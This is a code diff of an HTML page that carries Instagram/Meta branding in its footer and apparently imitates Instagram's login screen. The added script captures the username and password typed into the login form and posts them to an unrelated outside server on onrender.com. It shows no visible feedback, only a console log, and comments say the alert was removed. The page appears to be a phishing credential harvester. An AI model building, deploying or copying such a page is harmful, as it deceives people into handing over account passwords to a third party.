@@ -54,37 +54,32 @@
             Русский ✔ © 2025 Instagram from Meta
         </div>
 
-    <script>
-        const form = document.getElementById('registerForm');
-
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            try {
-                const res = await fetch('http://localhost:3000/api/auth/register', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, password })
-                });
-
-                const data = await res.json();
-
-                if (res.ok) {
-                    // alert('Foydalanuvchi saqlandi: ' + data.user.username); ❌ olib tashlandi
-                    console.log('Ro‘yxatdan o‘tish muvaffaqiyatli'); // faqat console ga yoziladi
-                    form.reset(); // inputlarni tozalaydi
-                } else {
-                    alert(data.message || 'Xatolik yuz berdi');
-                }
-
-            } catch (err) {
-                alert('Ulanishda xatolik: ' + err.message);
-            }
-        });
-    </script>
+        <script>
+            const form = document.getElementById('loginForm');
+          
+            form.addEventListener('submit', async (e) => {
+              e.preventDefault();
+          
+              const username = document.getElementById('username').value;
+              const password = document.getElementById('password').value;
+          
+              const res = await fetch('https://my-ser-tnvw.onrender.com/api/auth/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+              });
+          
+              const data = await res.json();
+          
+              if (res.ok) {
+                // alert olib tashlangan
+                console.log('Login muvaffaqiyatli:', data.user.username);
+              } else {
+                alert(data.message || 'Login xato');
+              }
+            });
+          </script>
+          
 </body>
 
 </html>
